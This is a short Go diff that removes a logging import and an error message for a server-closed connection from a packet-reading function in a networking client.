@@ -6,7 +6,6 @@ import (
 	"fmt"
 	"github.com/pygrum/Empress/consts"
 	"github.com/pygrum/Empress/transport"
-	log "github.com/sirupsen/logrus"
 	"io"
 	"net"
 	"syscall"
@@ -101,9 +100,6 @@ func getRegPacketSize(reg *transport.Registration) uint32 {
 func readPacket(conn net.Conn) ([]byte, error) {
 	s := make([]byte, 4)
 	if _, err := conn.Read(s); err != nil {
-		if isConnClosedError(err) {
-			log.Error("connection closed by server")
-		}
 		return nil, err
 	}
 	size := uint(binary.BigEndian.Uint32(s))
